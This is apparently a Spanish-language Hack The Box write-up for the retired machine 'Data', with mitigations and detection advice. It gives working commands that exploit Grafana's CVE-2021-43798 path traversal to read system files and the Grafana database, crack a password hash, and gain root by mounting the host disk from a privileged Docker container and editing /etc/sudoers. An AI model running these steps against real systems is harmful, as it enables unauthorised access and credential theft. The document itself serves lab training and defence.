---
machine: Data
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, grafana, cve-2021-43798, path-traversal, docker, privesc]
---

# Data — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Grafana 8.0.0 es vulnerable a CVE-2021-43798, un path traversal en el resolvedor de plugins. Permite leer `grafana.db`, crackear el hash PBKDF2 de `boris` y entrar por SSH. Una regla `sudo` sobre `docker exec --privileged` permite montar el disco del host y escribir en `/etc/sudoers`.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p22,3000 <IP>
```

- SSH en el host.
- Grafana 8.0.0 en el puerto 3000.
- El TTL y el comportamiento del servicio sugieren un contenedor separado del host.

## Enumeración

- El dominio es `data.htb`.
- El pie de Grafana confirma la versión 8.0.0.
- La ruta `/public/plugins/<plugin>/../../../../` no canonicaliza los segmentos `..`.

## Foothold

Se usa un plugin instalado, como `alertlist`, para recorrer el sistema de archivos y leer `/etc/passwd` y la base de datos de Grafana.

```bash
curl -s "http://data.htb:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
curl -s "http://data.htb:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
```

La base contiene usuarios y hashes PBKDF2. El hash de `boris` se crackea con `hashcat -m 10000` y la contraseña se reutiliza en SSH.

```bash
sqlite3 grafana.db 'select login,password from user;'
hashcat -m 10000 boris.hash /usr/share/wordlists/rockyou.txt
ssh boris@data.htb
```

## Escalada de privilegios

`sudo -l` permite ejecutar `docker exec` sin contraseña sobre un contenedor existente. El contenedor se lanza con `--privileged`, por lo que puede montar el disco del host.

```bash
sudo -l
docker ps
sudo /usr/bin/docker exec --privileged -u root -it <CONTAINER> bash
mount /dev/sda1 /mnt
echo 'boris ALL=(ALL) NOPASSWD: ALL' >> /mnt/etc/sudoers
```

Al salir del contenedor, `sudo -i` concede root en el host.

## Evidencia

- Lectura de `/etc/passwd` y `grafana.db` mediante traversal.
- Hash crackeado y acceso SSH, con contraseña redactada.
- Regla `sudo` y montaje de `/dev/sda1`.
- Flag redactada.

## Lecciones aprendidas

- El path traversal en plugins afecta a la ruta completa, no solo a archivos de configuración.
- Un hash PBKDF2 solo es tan fuerte como la contraseña elegida.
- `docker exec` con privilegios es equivalente a root en el host.

## Mitigaciones y detección

- Actualizar Grafana a 8.3.1 o posterior.
- No reutilizar contraseñas de aplicación en cuentas del sistema.
- Evitar `--privileged` y limitar qué contenedores puede ejecutar `sudo`.
- Auditar montajes de dispositivos y cambios en `/etc/sudoers`.

## Referencias

- <https://www.hackthebox.com/machines/Data>
- <https://nvd.nist.gov/vuln/detail/CVE-2021-43798>
- <https://grafana.com/security/security-advisories/cve-2021-43798/>
- <https://attack.mitre.org/techniques/T1611/>
